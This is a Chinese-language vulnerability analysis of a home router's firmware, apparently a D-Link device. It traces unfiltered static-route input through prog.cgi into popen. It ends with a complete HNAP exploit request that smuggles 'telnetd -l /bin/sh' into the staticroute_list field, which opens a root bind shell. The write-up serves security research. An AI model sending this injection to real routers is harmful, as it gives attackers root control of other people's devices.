漏洞分析

![](../Images/ca73879942efd76304e9a5e1c0cb8c1c.png)![](../Images/3dd01edac0796d31c182a413239c2ec0.png)![](../Images/3dd01edac0796d31c182a413239c2ec0.png)

使用 binwalk 提取固件

![](../Images/c9b0cdf3bd912c80290bf3bf83677ca7.png)![](../Images/35c13349c9445b59159068f87d3ff8f2.png)

漏洞产生位置是设置静态路由时，未对输入的内容进行过滤，从而造成命令执行。

这里我们查看对应的 HTML 源代码，这里可以清晰的看到发送的数据和请求的地址。

![](../Images/e125296ba8826742c01ff7e1b6a427ef.png)

根据请求地址进行搜索，查看负责处理请求的二进制应用。

![](../Images/0d6967636728b28caa54a43128c7903b.png)

可以看到 prog.cgi 中包含 SetStaticRouteSettings 的接口，这里我们直接使用 IDA 进行逆向分析。

![](../Images/e7dc625982f679307700cd734b83d5d6.png)

可以看到对应的请求及处理函数，这里 SetStaticRouteSettings 路由的处理函数是 sub\_43730C ，我们直接跟进。

![](../Images/ac7c36807c1d4d6c3d6880044830c953.png)

可以看到传递过来的 staticroute\_list 对应的值，继续往下跟踪。

![](../Images/59327948134d280e52b3cf46b858e25c.png)

可以看到根据逗号进行分割处理，将数据传递给触发漏洞的函数 sub\_437028 ，继续跟进。

![](../Images/2ff228795f50f12fa31bce4850b7ae47.png)

这里可以看到对传递过来的数据没有进行任何过滤，直接使用 sprintf 进行格式化拼接，由FCGI\_popen 进行处理，根据 popen 这个词，我们可以猜测这个函数会创建一个管道执行输入的命令。

![](../Images/91b6571ad5397f34b5ed3fc4935cd2ca.png)

查看 FCGI\_popen 可以看到为导入函数， FCGI\_popen 位于导入表中，通过 grep 搜索。

![](../Images/e7e7d01102583e83c0462e922c971549.png)

可以看到 FCGI\_popen 位于 libfcgi.so.0.0.0 ，接下来逆向分析对应的动态链接库。

![](../Images/43e81a2b3fc14c3c8db067f8744e5576.png)

可以看到确实调用了 popen 创建管道来执行命令。

![](../Images/3dd01edac0796d31c182a413239c2ec0.png)![](../Images/3dd01edac0796d31c182a413239c2ec0.png)

漏洞利用

![](../Images/ca73879942efd76304e9a5e1c0cb8c1c.png)![](../Images/3dd01edac0796d31c182a413239c2ec0.png)![](../Images/3dd01edac0796d31c182a413239c2ec0.png)

根据漏洞产生的原因，我们只需要使用逗号分割出三个地址和要执行的命令即可，最终构造的 EXP 如下：

POST/HNAP1/ HTTP/1.1

Host: 192.168.100.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86\_64; rv:88.0) Gecko/20100101

Firefox/88.0

Accept: application/json

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Content-Type: application/json

SOAPACTION: "http://purenetworks.com/HNAP1/SetStaticRouteSettings"

HNAP\_AUTH: \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\* # 根据用户的实际认证

Content-Length: 130

Origin: http://192.168.100.1

Connection: close

Referer: http://192.168.100.1/Staticroute.html

Cookie: work\_mode=router; uid=KjSsMz7d; PrivateKey=\*\*\*\*\*\*\*\*\*\*\*\*; timeout=218

{"SetStaticRouteSettings":

{"staticroute\_list":"192.168.1.1,255.255.255.255,192.168.0.1,\`telnetd -l /bin/sh

\-p 10000 -b 0.0.0.0\`"}} # \`中添加要执行的命令

![](../Images/8df5879850a68ef4760976bac780044c.png)

可以看到发送成功，使用 nc 连接启动的 telnetd 服务。

![](../Images/2c93236849b9a780171a4ce3332658bb.png)

可以看到命令执行成功。

总结

![](../Images/ca73879942efd76304e9a5e1c0cb8c1c.png)![](../Images/3dd01edac0796d31c182a413239c2ec0.png)![](../Images/3dd01edac0796d31c182a413239c2ec0.png)

通过上述漏洞可以看到设备在设置网络层功能时，会调用 popen 执行设置网络的命令， popen执行的命令往往根据用户的输入进行格式化拼接，如果对输入的内容没有进行严格过滤，则很容易造成命令执行，并且由于只有 root 权限才能配置网络服务，所以，这时获取的 shell 就是最高权限的，不需要进行提权操作
